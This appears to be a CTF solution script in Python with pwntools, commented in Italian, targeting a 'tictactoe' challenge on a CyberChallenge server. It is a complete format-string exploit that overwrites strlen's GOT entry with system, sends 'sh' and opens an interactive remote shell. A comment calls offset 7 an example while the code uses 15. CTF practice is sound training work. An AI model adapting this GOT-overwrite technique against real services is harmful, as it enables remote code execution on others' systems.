from pwn import *

# 1. Impostiamo il contesto leggendo il file locale
# Sostituisci 'nome_del_file_scaricato' con il nome reale dell'eseguibile della CTF
exe = ELF('./tictactoe')
context.binary = exe 

# 2. Ci connettiamo al server remoto invece che al processo locale
print("[*] Connessione alla CyberChallenge in corso...")
r = remote('tictactoe.challs.cyberchallenge.it', 9132)

# --- TROVARE L'OFFSET ---
# ATTENZIONE: Questo numero 7 è un esempio! 
# Per trovare il tuo offset reale:
# Collegati a mano con netcat, inserisci "AAAA %p %p %p %p %p %p %p %p %p"
# e conta a quale posizione appare il valore "0x41414141" (che sono le tue 4 'A').
# Quella posizione è il tuo offset.
offset = 15 

# --- ROUND 1: CORRUZIONE DELLA GOT ---
print("[*] Generazione del proiettile magico (Format String)...")
# pwntools usa il file locale per capire dove scrivere (got['strlen']) e cosa scrivere (sym['system'])
payload_1 = fmtstr_payload(offset, {exe.got['strlen']: exe.sym['system']})

# Inviamo la mossa sporca
r.sendlineafter(b"Your move: ", payload_1)
print("[+] GOT sovrascritta con successo. strlen() ora è system()!")

# --- ROUND 2: ESECUZIONE ---
print("[*] Invio dell'innesco...")
payload_2 = b"sh"
r.sendlineafter(b"Your move: ", payload_2)

# --- ROUND 3: SHELL ---
print("[*] Goditi il server!")
r.interactive()
